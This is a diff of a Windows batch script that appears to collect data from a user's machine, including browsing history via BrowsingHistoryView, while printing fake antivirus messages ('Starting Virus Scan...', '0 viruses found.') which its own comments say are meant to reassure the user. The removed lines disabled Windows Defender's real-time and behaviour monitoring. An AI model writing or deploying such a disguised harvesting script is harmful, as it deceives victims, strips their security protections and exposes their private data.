@@ -1,23 +1,3 @@
-@echo off
-:: Disable Windows Defender using PowerShell commands
-
-:: Run PowerShell command to disable real-time protection
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-
-:: Disable other Defender features
-powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
-powershell -Command "Set-MpPreference -DisableOnAccessProtection $true"
-powershell -Command "Set-MpPreference -DisableScanOnRealtimeEnable $true"
-
-:: Optional: Disable the Defender service (not recommended)
-:: sc stop WinDefend
-:: sc config WinDefend start=disabled
-
-echo Windows Defender has been disabled.
-pause
-
-cd pssww
-
 :: This script will launch the various tools and save the output to individual .txt files.
 ::	If this script is re-run on the same host, in the context of the same user, on the same day, 
 :: 		the text files will be overwritten.
@@ -27,6 +7,7 @@ cd pssww
 @echo off
 
 :: Return fake antivirus program string to reassure user
+echo Starting Virus Scan...
 
 :: Set variable for the dynimic portions of the file, and include the file extension
 FOR %%A IN (%Date:/=%) DO SET Today=%%A
@@ -118,5 +99,9 @@ start BrowsingHistoryView.exe /stext BrowsingHistoryView_%DYNPATHNAME%
 
 
 :: Return fake antivirus program string to reassure user
+echo 0 viruses found.
 
+:: Dirty Windows OS agnostic workaround to leave the fake antivirus echo strings open 
+:: 	for 5 seconds before auto-exiting the DOS window popup
+ping -n 5 127.0.0.1 > nul
 exit
